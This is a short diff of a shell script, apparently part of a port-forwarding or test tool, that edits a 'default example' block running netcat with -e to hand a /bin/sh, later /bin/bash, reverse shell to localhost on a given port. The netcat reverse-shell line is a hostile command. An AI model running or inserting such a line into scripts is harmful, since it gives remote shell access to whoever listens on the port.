@@ -40,11 +40,11 @@ CLIENT_IP=$1
 # If iptables isn't installed.
 REAL_SERVICE_PORT=$2
 
-# Default example: starting a reverse shell
+# Default example: starting a reverse shell on localhost
 REVERSE_SHELL_HOST='localhost'
 REVERSE_SHELL_PORT=$REAL_SERVICE_PORT
-echo "Starting a reverse shell on $REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT"
-netcat -e /bin/sh $REVERSE_SHELL_HOST $REVERSE_SHELL_PORT
+echo "Connecting to reverse shell on $REVERSE_SHELL_HOST:$REVERSE_SHELL_PORT"
+netcat -vvv -e /bin/bash $REVERSE_SHELL_HOST $REVERSE_SHELL_PORT
 
 echo "Done, Exiting."
 exit 0
